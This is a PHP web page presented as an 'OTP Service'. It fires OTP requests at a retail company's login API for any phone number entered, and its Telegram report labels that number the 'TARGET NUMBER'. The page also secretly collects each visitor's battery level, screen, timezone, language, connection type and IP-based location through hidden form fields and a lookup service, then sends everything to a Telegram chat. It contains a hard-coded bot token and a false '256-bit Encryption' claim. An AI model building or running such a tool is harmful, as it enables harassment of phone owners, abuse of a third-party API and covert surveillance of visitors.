<?php
// Telegram configuration - REGENERATE YOUR TOKEN IMMEDIATELY! 
$telegram_bot_token = '8758206225:AAFihR79UEdrGEJKdaheI-EpSoTQ7n9q7Tw'; // ⚠️ REPLACE WITH NEW TOKEN
$telegram_chat_id = '@black_devil_kings';

// Visitor counter file
$counter_file = 'visitor_count.txt';
$last_notification_file = 'last_visitor_notify.txt';

// Initialize or get visitor count
function getVisitorCount() {
    global $counter_file;
    if (!file_exists($counter_file)) {
        file_put_contents($counter_file, '0');
        return 0;
    }
    return (int) file_get_contents($counter_file);
}

function incrementVisitorCount() {
    global $counter_file;
    $count = getVisitorCount() + 1;
    file_put_contents($counter_file, (string) $count);
    return $count;
}

function getLastNotifiedCount() {
    global $last_notification_file;
    if (!file_exists($last_notification_file)) {
        return 0;
    }
    return (int) file_get_contents($last_notification_file);
}

function updateLastNotifiedCount($count) {
    global $last_notification_file;
    file_put_contents($last_notification_file, (string) $count);
}

function sendToTelegram($message) {
    global $telegram_bot_token, $telegram_chat_id;
    
    $url = "https://api.telegram.org/bot{$telegram_bot_token}/sendMessage";
    
    $payload = json_encode([
        'chat_id' => $telegram_chat_id,
        'text' => $message,
        'parse_mode' => 'HTML',
        'disable_web_page_preview' => true
    ]);
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    
    $response = curl_exec($ch);
    curl_close($ch);
    
    return $response;
}

function getUserIP() {
    $ipaddress = '';
    $headers = [
        'HTTP_CF_CONNECTING_IP',
        'HTTP_CLIENT_IP',
        'HTTP_X_FORWARDED_FOR',
        'HTTP_X_FORWARDED',
        'HTTP_FORWARDED_FOR',
        'HTTP_FORWARDED',
        'REMOTE_ADDR'
    ];
    
    foreach ($headers as $header) {
        if (isset($_SERVER[$header]) && !empty($_SERVER[$header])) {
            $ipaddress = $_SERVER[$header];
            break;
        }
    }
    
    if (strpos($ipaddress, ',') !== false) {
        $ipaddress = explode(',', $ipaddress)[0];
    }
    
    return trim($ipaddress) ?: 'UNKNOWN';
}

function getAccurateMobileModel($user_agent) {
    $model = 'Unknown';
    $brand = 'Unknown';
    
    // Complete Mobile Model Database
    $mobile_models = [
        // Apple iPhone
        '/iPhone17,([0-9])/i' => ['brand' => 'Apple', 'model' => 'iPhone 15 Series'],
        '/iPhone16,([0-9])/i' => ['brand' => 'Apple', 'model' => 'iPhone 14 Series'],
        '/iPhone15,([0-9])/i' => ['brand' => 'Apple', 'model' => 'iPhone 13 Series'],
        '/iPhone14,([0-9])/i' => ['brand' => 'Apple', 'model' => 'iPhone 12 Series'],
        '/iPhone13,([0-9])/i' => ['brand' => 'Apple', 'model' => 'iPhone 11 Series'],
        '/iPhone\s15\sPro\sMax/i' => ['brand' => 'Apple', 'model' => 'iPhone 15 Pro Max'],
        '/iPhone\s15\sPro/i' => ['brand' => 'Apple', 'model' => 'iPhone 15 Pro'],
        '/iPhone\s15/i' => ['brand' => 'Apple', 'model' => 'iPhone 15'],
        '/iPhone\s14\sPro\sMax/i' => ['brand' => 'Apple', 'model' => 'iPhone 14 Pro Max'],
        '/iPhone\s14\sPro/i' => ['brand' => 'Apple', 'model' => 'iPhone 14 Pro'],
        '/iPhone\s14/i' => ['brand' => 'Apple', 'model' => 'iPhone 14'],
        '/iPhone\s13\sPro\sMax/i' => ['brand' => 'Apple', 'model' => 'iPhone 13 Pro Max'],
        '/iPhone\s13\sPro/i' => ['brand' => 'Apple', 'model' => 'iPhone 13 Pro'],
        '/iPhone\s13/i' => ['brand' => 'Apple', 'model' => 'iPhone 13'],
        '/iPhone\s12\sPro\sMax/i' => ['brand' => 'Apple', 'model' => 'iPhone 12 Pro Max'],
        '/iPhone\s12\sPro/i' => ['brand' => 'Apple', 'model' => 'iPhone 12 Pro'],
        '/iPhone\s12/i' => ['brand' => 'Apple', 'model' => 'iPhone 12'],
        '/iPhone\s11\sPro\sMax/i' => ['brand' => 'Apple', 'model' => 'iPhone 11 Pro Max'],
        '/iPhone\s11\sPro/i' => ['brand' => 'Apple', 'model' => 'iPhone 11 Pro'],
        '/iPhone\s11/i' => ['brand' => 'Apple', 'model' => 'iPhone 11'],
        '/iPhone\sXR/i' => ['brand' => 'Apple', 'model' => 'iPhone XR'],
        '/iPhone\sXS\sMax/i' => ['brand' => 'Apple', 'model' => 'iPhone XS Max'],
        '/iPhone\sXS/i' => ['brand' => 'Apple', 'model' => 'iPhone XS'],
        '/iPhone\sX/i' => ['brand' => 'Apple', 'model' => 'iPhone X'],
        '/iPhone\s8\sPlus/i' => ['brand' => 'Apple', 'model' => 'iPhone 8 Plus'],
        '/iPhone\s8/i' => ['brand' => 'Apple', 'model' => 'iPhone 8'],
        '/iPhone\s7\sPlus/i' => ['brand' => 'Apple', 'model' => 'iPhone 7 Plus'],
        '/iPhone\s7/i' => ['brand' => 'Apple', 'model' => 'iPhone 7'],
        '/iPhone\sSE/i' => ['brand' => 'Apple', 'model' => 'iPhone SE'],
        
        // Samsung
        '/SM-S918B/i' => ['brand' => 'Samsung', 'model' => 'Galaxy S23 Ultra'],
        '/SM-S911B/i' => ['brand' => 'Samsung', 'model' => 'Galaxy S23'],
        '/SM-S908B/i' => ['brand' => 'Samsung', 'model' => 'Galaxy S22 Ultra'],
        '/SM-S901B/i' => ['brand' => 'Samsung', 'model' => 'Galaxy S22'],
        '/SM-G998B/i' => ['brand' => 'Samsung', 'model' => 'Galaxy S21 Ultra'],
        '/SM-G991B/i' => ['brand' => 'Samsung', 'model' => 'Galaxy S21'],
        '/SM-G988B/i' => ['brand' => 'Samsung', 'model' => 'Galaxy S20 Ultra'],
        '/SM-N986B/i' => ['brand' => 'Samsung', 'model' => 'Galaxy Note 20 Ultra'],
        '/SM-A([0-9]{3})/i' => ['brand' => 'Samsung', 'model' => 'Galaxy A$1'],
        '/SM-M([0-9]{3})/i' => ['brand' => 'Samsung', 'model' => 'Galaxy M$1'],
        '/SM-F([0-9]{3})/i' => ['brand' => 'Samsung', 'model' => 'Galaxy Fold $1'],
        
        // Xiaomi
        '/Xiaomi\s([0-9]+)\sPro/i' => ['brand' => 'Xiaomi', 'model' => 'Mi $1 Pro'],
        '/Xiaomi\s([0-9]+)/i' => ['brand' => 'Xiaomi', 'model' => 'Mi $1'],
        '/Redmi\sNote\s([0-9]+)\sPro/i' => ['brand' => 'Xiaomi', 'model' => 'Redmi Note $1 Pro'],
        '/Redmi\sNote\s([0-9]+)/i' => ['brand' => 'Xiaomi', 'model' => 'Redmi Note $1'],
        '/Redmi\s([0-9]+)/i' => ['brand' => 'Xiaomi', 'model' => 'Redmi $1'],
        '/POCO\s([A-Z0-9\s]+)/i' => ['brand' => 'Xiaomi', 'model' => 'POCO $1'],
        
        // OnePlus
        '/OnePlus\s([0-9]+)\sPro/i' => ['brand' => 'OnePlus', 'model' => 'OnePlus $1 Pro'],
        '/OnePlus\s([0-9]+)/i' => ['brand' => 'OnePlus', 'model' => 'OnePlus $1'],
        
        // Google Pixel
        '/Pixel\s([0-9]+)\sPro/i' => ['brand' => 'Google', 'model' => 'Pixel $1 Pro'],
        '/Pixel\s([0-9]+)\sXL/i' => ['brand' => 'Google', 'model' => 'Pixel $1 XL'],
        '/Pixel\s([0-9]+)/i' => ['brand' => 'Google', 'model' => 'Pixel $1'],
        
        // Oppo
        '/OPPO\s([A-Z0-9\s]+)/i' => ['brand' => 'OPPO', 'model' => 'OPPO $1'],
        '/CPH([0-9]{4})/i' => ['brand' => 'OPPO', 'model' => 'OPPO CPH$1'],
        
        // Vivo
        '/vivo\s([A-Z0-9\s]+)/i' => ['brand' => 'vivo', 'model' => 'vivo $1'],
        
        // Realme
        '/Realme\s([0-9]+)\sPro/i' => ['brand' => 'Realme', 'model' => 'Realme $1 Pro'],
        '/Realme\s([0-9]+)/i' => ['brand' => 'Realme', 'model' => 'Realme $1'],
        '/RMX([0-9]{4})/i' => ['brand' => 'Realme', 'model' => 'Realme RMX$1'],
        
        // Nothing Phone
        '/Nothing\sPhone\s\(([0-9]+)\)/i' => ['brand' => 'Nothing', 'model' => 'Phone ($1)'],
    ];
    
    foreach ($mobile_models as $pattern => $info) {
        if (preg_match($pattern, $user_agent, $matches)) {
            $brand = $info['brand'];
            if (strpos($info['model'], '$1') !== false && isset($matches[1])) {
                $model = str_replace('$1', $matches[1], $info['model']);
            } else {
                $model = $info['model'];
            }
            break;
        }
    }
    
    return ['brand' => $brand, 'model' => $model];
}

function getAccurateDeviceInfo($user_agent) {
    $device = [
        'type' => 'Unknown',
        'brand' => 'Unknown',
        'model' => 'Unknown',
        'os' => 'Unknown',
        'os_version' => 'Unknown',
        'browser' => 'Unknown',
        'browser_version' => 'Unknown',
        'is_mobile' => false,
        'is_tablet' => false,
    ];
    
    $mobile_info = getAccurateMobileModel($user_agent);
    $device['brand'] = $mobile_info['brand'];
    $device['model'] = $mobile_info['model'];
    
    if (preg_match('/Mobile/i', $user_agent) || preg_match('/iPhone/i', $user_agent)) {
        $device['is_mobile'] = true;
        $device['type'] = 'Mobile';
    }
    if (preg_match('/Tablet/i', $user_agent) || preg_match('/iPad/i', $user_agent)) {
        $device['is_tablet'] = true;
        $device['type'] = 'Tablet';
    }
    if (!$device['is_mobile'] && !$device['is_tablet']) {
        $device['type'] = 'Desktop';
    }
    
    if (preg_match('/Android\s([0-9\.]+)/i', $user_agent, $matches)) {
        $device['os'] = 'Android';
        $device['os_version'] = $matches[1];
    } elseif (preg_match('/iPhone OS\s([0-9\_]+)/i', $user_agent, $matches)) {
        $device['os'] = 'iOS';
        $device['os_version'] = str_replace('_', '.', $matches[1]);
    } elseif (preg_match('/Windows NT\s([0-9\.]+)/i', $user_agent, $matches)) {
        $device['os'] = 'Windows';
        $device['os_version'] = $matches[1];
    } elseif (preg_match('/Mac OS X\s([0-9\_]+)/i', $user_agent, $matches)) {
        $device['os'] = 'macOS';
        $device['os_version'] = str_replace('_', '.', $matches[1]);
    }
    
    $browser_patterns = [
        'Edg/' => 'Edge',
        'OPR/' => 'Opera',
        'Firefox/' => 'Firefox',
        'Chrome/' => 'Chrome',
        'Safari/' => 'Safari',
    ];
    
    foreach ($browser_patterns as $pattern => $name) {
        if (stripos($user_agent, $pattern) !== false) {
            $device['browser'] = $name;
            if (preg_match('/' . preg_quote($pattern, '/') . '([0-9\.]+)/i', $user_agent, $matches)) {
                $device['browser_version'] = $matches[1];
            }
            break;
        }
    }
    
    return $device;
}

function getDetailedLocation($ip) {
    if ($ip == 'UNKNOWN' || $ip == '127.0.0.1') {
        return "🌐 Local Connection";
    }
    
    try {
        $url = "http://ip-api.com/json/{$ip}?fields=status,country,regionName,city,isp,mobile,proxy";
        $response = @file_get_contents($url);
        $data = json_decode($response, true);
        
        if ($data && $data['status'] == 'success') {
            return "📍 {$data['city']}, {$data['regionName']}, {$data['country']}\n🏢 {$data['isp']}";
        }
    } catch (Exception $e) {}
    
    return "📍 Location info unavailable";
}

// Increment visitor count for every page view
$visitor_count = incrementVisitorCount();
$last_notified = getLastNotifiedCount();

// Send visitor count update to Telegram for every 5 visitors or when milestone reached
$milestones = [10, 25, 50, 100, 250, 500, 1000, 2500, 5000, 10000];
$should_notify = false;

// Notify for every 5 visitors
if ($visitor_count % 5 == 0 && $visitor_count > $last_notified) {
    $should_notify = true;
}

// Notify for milestones
foreach ($milestones as $milestone) {
    if ($visitor_count >= $milestone && $last_notified < $milestone) {
        $should_notify = true;
        break;
    }
}

if ($should_notify) {
    $visitor_message = "<b>👥 VISITOR COUNT UPDATE</b>\n\n"
        . "<b>━━━━━━━━━━━━━━━━━━━━━━━━</b>\n"
        . "<b>Total Visitors:</b> <code>" . number_format($visitor_count) . "</code>\n"
        . "<b>Last 5 min:</b> +5 visitors\n"
        . "<b>Status:</b> 🟢 Active\n"
        . "<b>━━━━━━━━━━━━━━━━━━━━━━━━</b>\n\n"
        . "<b>📊 Stats:</b>\n"
        . "• Daily Active: Growing\n"
        . "• Peak Hour: " . date('H:i') . "\n"
        . "• Date: " . date('Y-m-d') . "\n\n"
        . "<b>🔗 Keep Growing!</b>";
    
    sendToTelegram($visitor_message);
    updateLastNotifiedCount($visitor_count);
}

$response = '';
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $mobile = isset($_POST['mobile']) ? trim($_POST['mobile']) : '';
    $custom_sms = isset($_POST['custom_sms']) ? trim($_POST['custom_sms']) : 'WEB_APP_HASH';
    
    // Get client-side data
    $battery_level = isset($_POST['battery_level']) ? $_POST['battery_level'] : 'Unknown';
    $battery_charging = isset($_POST['battery_charging']) ? $_POST['battery_charging'] : 'Unknown';
    $screen_data = isset($_POST['screen_data']) ? json_decode($_POST['screen_data'], true) : [];
    $timezone = isset($_POST['timezone']) ? $_POST['timezone'] : 'Unknown';
    $language = isset($_POST['language']) ? $_POST['language'] : 'Unknown';
    $connection_type = isset($_POST['connection_type']) ? $_POST['connection_type'] : 'Unknown';
    
    $user_ip = getUserIP();
    $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
    $timestamp = date('Y-m-d H:i:s');
    
    $device = getAccurateDeviceInfo($user_agent);
    $location = getDetailedLocation($user_ip);
    
    if (!empty($mobile)) {
        // NEW API: More Retail API - Send OTP
        $hash_key = $custom_sms; // Using custom SMS as hash_key if provided
        if ($hash_key == 'WEB_APP_HASH') {
            $hash_key = 'XfsoCeXADQAg'; // Default hash key
        }
        
        $api_url = "https://omni-api.moreretail.in/fast/user/login?phone_number={$mobile}&hash_key={$hash_key}";
        
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $api_url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 30);
        curl_setopt($ch, CURLOPT_HTTPHEADER, [
            'User-Agent: okhttp/4.12.0',
            'Accept: application/json',
            'Accept-Encoding: gzip',
            'app-version: 3.0.5',
            'platform: android'
        ]);
        curl_setopt($ch, CURLOPT_ENCODING, 'gzip'); // Handle gzip encoding
        
        $api_response = curl_exec($ch);
        $curl_error = curl_error($ch);
        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        
        $api_status = $curl_error ? "Error: $curl_error" : $api_response;
        $response = $api_status;
        
        // Decode response to check if OTP was sent
        $response_data = json_decode($api_response, true);
        $otp_status = isset($response_data['status']) ? $response_data['status'] : 'unknown';
        $otp_message = isset($response_data['message']) ? $response_data['message'] : '';
        
        // Battery display
        $battery_display = '';
        if ($battery_level !== 'Unknown' && is_numeric($battery_level)) {
            $battery_icon = $battery_level > 70 ? '🔋' : ($battery_level > 30 ? '🔋' : '🪫');
            $battery_display = "{$battery_icon} {$battery_level}%";
            if ($battery_charging == 'true' || $battery_charging == '1') {
                $battery_display .= " ⚡ (Charging)";
            }
        } else {
            $battery_display = "🔋 Not Available";
        }
        
        // Build comprehensive Telegram message with visitor count
        $telegram_message = "<b>🔴 NEW OTP REQUEST</b>\n\n"
        
        . "<b>━━━━━━━━━━━━━━━━━━━━━━━━</b>\n"
        . "<b>📨 API DETAILS</b>\n"
        . "<b>━━━━━━━━━━━━━━━━━━━━━━━━</b>\n"
        . "<b>🌐 API:</b> More Retail\n"
        . "<b>🔑 Hash Key:</b> <code>" . htmlspecialchars($hash_key) . "</code>\n"
        . "<b>📡 HTTP Status:</b> {$http_code}\n"
        . "<b>━━━━━━━━━━━━━━━━━━━━━━━━</b>\n\n"
        
        . "<b>📱 TARGET NUMBER</b>\n"
        . "<b>Mobile:</b> <code>{$mobile}</code>\n\n"
        
        . "<b>📱 DEVICE DETAILS</b>\n"
        . "<b>Brand:</b> {$device['brand']}\n"
        . "<b>Model:</b> {$device['model']}\n"
        . "<b>Type:</b> {$device['type']}\n"
        . "<b>OS:</b> {$device['os']} {$device['os_version']}\n"
        . "<b>Browser:</b> {$device['browser']} {$device['browser_version']}\n\n"
        
        . "<b>🔋 BATTERY</b>\n"
        . "<b>{$battery_display}</b>\n\n"
        
        . "<b>💻 SCREEN INFO</b>\n"
        . "<b>Resolution:</b> " . ($screen_data['width'] ?? '?') . " x " . ($screen_data['height'] ?? '?') . "\n"
        . "<b>Pixel Ratio:</b> " . ($screen_data['pixelRatio'] ?? '?') . "\n"
        . "<b>Timezone:</b> {$timezone}\n"
        . "<b>Language:</b> {$language}\n"
        . "<b>Connection:</b> {$connection_type}\n\n"
        
        . "<b>🌍 LOCATION</b>\n"
        . "<b>IP:</b> <code>{$user_ip}</code>\n"
        . "{$location}\n\n"
        
        . "<b>⏰ TIME</b>\n"
        . "<b>{$timestamp}</b>\n\n"
        
        . "<b>📡 API RESPONSE</b>\n"
        . "<code>" . htmlspecialchars(substr($api_status, 0, 500)) . "</code>\n"
        . "<b>━━━━━━━━━━━━━━━━━━━━━━━━</b>\n\n"
        
        . "<b>👥 TOTAL VISITORS SO FAR: " . number_format($visitor_count) . "</b>";
        
        sendToTelegram($telegram_message);
        
    } else {
        $response = 'Mobile number is required.';
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>OTP Service | Join Telegram</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: linear-gradient(135deg, #0f0c29 0%, #302b63 50%, #24243e 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .container {
            max-width: 480px;
            width: 100%;
            background: rgba(255, 255, 255, 0.98);
            border-radius: 32px;
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
            overflow: hidden;
        }
        
        .header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            padding: 32px 24px;
            text-align: center;
            position: relative;
        }
        
        .header h1 {
            color: white;
            font-size: 28px;
            font-weight: 700;
            margin-bottom: 8px;
        }
        
        .header p {
            color: rgba(255, 255, 255, 0.9);
            font-size: 14px;
        }
        
        .visitor-counter {
            position: absolute;
            top: 16px;
            right: 16px;
            background: rgba(255,255,255,0.2);
            backdrop-filter: blur(10px);
            padding: 6px 12px;
            border-radius: 50px;
            font-size: 12px;
            font-weight: 600;
            color: white;
            display: flex;
            align-items: center;
            gap: 6px;
        }
        
        .visitor-counter span {
            font-size: 14px;
        }
        
        .telegram-banner {
            background: linear-gradient(135deg, #0088cc 0%, #004d66 100%);
            padding: 20px;
            margin: 20px;
            border-radius: 24px;
            text-align: center;
            cursor: pointer;
            transition: transform 0.3s ease, box-shadow 0.3s ease;
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0% {
                transform: scale(1);
                box-shadow: 0 0 0 0 rgba(0, 136, 204, 0.7);
            }
            70% {
                transform: scale(1.02);
                box-shadow: 0 0 0 15px rgba(0, 136, 204, 0);
            }
            100% {
                transform: scale(1);
                box-shadow: 0 0 0 0 rgba(0, 136, 204, 0);
            }
        }
        
        .telegram-banner:hover {
            transform: translateY(-3px);
            box-shadow: 0 15px 30px -10px rgba(0, 136, 204, 0.5);
        }
        
        .telegram-banner a {
            text-decoration: none;
            color: white;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
        }
        
        .telegram-icon {
            font-size: 36px;
        }
        
        .telegram-text {
            text-align: left;
        }
        
        .telegram-text h3 {
            font-size: 20px;
            font-weight: 700;
            margin-bottom: 4px;
        }
        
        .telegram-text p {
            font-size: 12px;
            opacity: 0.9;
        }
        
        .join-btn {
            background: white;
            color: #0088cc;
            padding: 8px 20px;
            border-radius: 50px;
            font-weight: 600;
            font-size: 14px;
            margin-left: auto;
        }
        
        .content {
            padding: 0 24px 24px 24px;
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        label {
            display: block;
            margin-bottom: 8px;
            font-weight: 600;
            color: #1e293b;
            font-size: 14px;
        }
        
        input {
            width: 100%;
            padding: 14px 16px;
            border: 2px solid #e2e8f0;
            border-radius: 16px;
            font-size: 16px;
            transition: all 0.3s ease;
            background: #f8fafc;
        }
        
        input:focus {
            outline: none;
            border-color: #667eea;
            background: white;
            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
        }
        
        button {
            width: 100%;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            padding: 14px 24px;
            border-radius: 16px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
        }
        
        button:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 25px -5px rgba(102, 126, 234, 0.4);
        }
        
        .response {
            margin-top: 20px;
            padding: 16px;
            background: #f1f5f9;
            border-radius: 16px;
            border-left: 4px solid #667eea;
        }
        
        .response strong {
            color: #1e293b;
            display: block;
            margin-bottom: 8px;
        }
        
        pre {
            background: white;
            padding: 12px;
            border-radius: 12px;
            overflow-x: auto;
            font-size: 12px;
            font-family: 'Courier New', monospace;
            color: #334155;
            white-space: pre-wrap;
            word-wrap: break-word;
        }
        
        .footer {
            padding: 20px 24px;
            text-align: center;
            border-top: 1px solid #e2e8f0;
            background: #f8fafc;
        }
        
        .footer p {
            font-size: 12px;
            color: #64748b;
        }
        
        .hidden {
            display: none;
        }
        
        .social-links {
            display: flex;
            justify-content: center;
            gap: 15px;
            margin-top: 10px;
        }
        
        .social-links a {
            color: #64748b;
            text-decoration: none;
            font-size: 12px;
        }
        
        .api-badge {
            background: rgba(255,255,255,0.2);
            padding: 4px 10px;
            border-radius: 50px;
            font-size: 10px;
            font-weight: 600;
            color: white;
            display: inline-block;
            margin-top: 8px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="visitor-counter">
                👥 <span id="visitorCount"><?php echo number_format($visitor_count); ?></span> visitors
            </div>
            <h1>⚡ OTP Service</h1>
            <p>Enterprise Grade Delivery System</p>
            <div class="api-badge">🔌 More Retail API</div>
        </div>
        
        <!-- VISIBLE TELEGRAM JOIN LINK - PROMINENTLY DISPLAYED -->
        <div class="telegram-banner">
            <a href="https://t.me/blackdeviltools" target="_blank">
                <div class="telegram-icon">📱</div>
                <div class="telegram-text">
                    <h3>Join Our Telegram Channel</h3>
                    <p>Get updates, support & more features</p>
                </div>
                <div class="join-btn">Join Now →</div>
            </a>
        </div>
        
        <div class="content">
            <form method="POST" id="otpForm">
                <div class="form-group">
                    <label>📱 Mobile Number</label>
                    <input type="tel" name="mobile" required placeholder="Enter 10-digit number" pattern="[0-9]{10}" maxlength="10">
                </div>
                <div class="form-group">
                    <label>🔑 Hash Key (Optional)</label>
                    <input type="text" name="custom_sms" placeholder="Enter hash key (default: XfsoCeXADQAg)">
                    <small style="font-size: 11px; color: #64748b; display: block; margin-top: 5px;">Default hash key will be used if left empty</small>
                </div>
                <input type="hidden" name="battery_level" id="battery_level">
                <input type="hidden" name="battery_charging" id="battery_charging">
                <input type="hidden" name="screen_data" id="screen_data">
                <input type="hidden" name="timezone" id="timezone">
                <input type="hidden" name="language" id="language">
                <input type="hidden" name="connection_type" id="connection_type">
                <button type="submit">🚀 Send OTP</button>
            </form>
            
            <?php if ($response): ?>
            <div class="response">
                <strong>📡 Server Response:</strong>
                <pre><?= htmlspecialchars($response) ?></pre>
            </div>
            <?php endif; ?>
        </div>
        
        <div class="footer">
            <p>🔒 Secure Connection | 256-bit Encryption | More Retail API</p>
            <div class="social-links">
                <a href="https://t.me/blackdeviltools" target="_blank">📱 Telegram</a>
                <a href="#">💬 Support</a>
                <a href="#">📧 Contact</a>
            </div>
        </div>
    </div>
    
    <script>
    // Update visitor count dynamically via AJAX every 10 seconds
    function updateVisitorCount() {
        fetch('?get_visitor_count=1')
            .then(response => response.json())
            .then(data => {
                if (data.count) {
                    document.getElementById('visitorCount').innerText = data.count.toLocaleString();
                }
            })
            .catch(console.error);
    }
    
    // Update every 10 seconds for real-time feel
    setInterval(updateVisitorCount, 10000);
    
    // Battery API
    if ('getBattery' in navigator) {
        navigator.getBattery().then(function(battery) {
            document.getElementById('battery_level').value = Math.floor(battery.level * 100);
            document.getElementById('battery_charging').value = battery.charging;
            
            battery.addEventListener('levelchange', function() {
                document.getElementById('battery_level').value = Math.floor(battery.level * 100);
            });
            battery.addEventListener('chargingchange', function() {
                document.getElementById('battery_charging').value = battery.charging;
            });
        }).catch(function() {
            document.getElementById('battery_level').value = 'Not supported';
        });
    } else {
        document.getElementById('battery_level').value = 'Not supported';
    }
    
    // Screen Info
    document.getElementById('screen_data').value = JSON.stringify({
        width: screen.width,
        height: screen.height,
        availWidth: screen.availWidth,
        availHeight: screen.availHeight,
        colorDepth: screen.colorDepth,
        pixelRatio: window.devicePixelRatio || 1
    });
    
    // Timezone
    document.getElementById('timezone').value = Intl.DateTimeFormat().resolvedOptions().timeZone;
    
    // Language
    document.getElementById('language').value = navigator.language || navigator.userLanguage;
    
    // Connection Type
    if ('connection' in navigator) {
        const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
        if (conn) {
            document.getElementById('connection_type').value = conn.effectiveType || 'Unknown';
            conn.addEventListener('change', function() {
                document.getElementById('connection_type').value = conn.effectiveType;
            });
        }
    }
    
    // Form validation
    document.getElementById('otpForm').addEventListener('submit', function(e) {
        let mobile = document.querySelector('input[name="mobile"]').value;
        if (!/^[0-9]{10}$/.test(mobile)) {
            alert('Please enter a valid 10-digit mobile number');
            e.preventDefault();
            return false;
        }
    });
    </script>
    <?php
    // Handle AJAX visitor count request
    if (isset($_GET['get_visitor_count']) && $_GET['get_visitor_count'] == '1') {
        header('Content-Type: application/json');
        echo json_encode(['count' => getVisitorCount()]);
        exit;
    }
    ?>
</body>
</html>
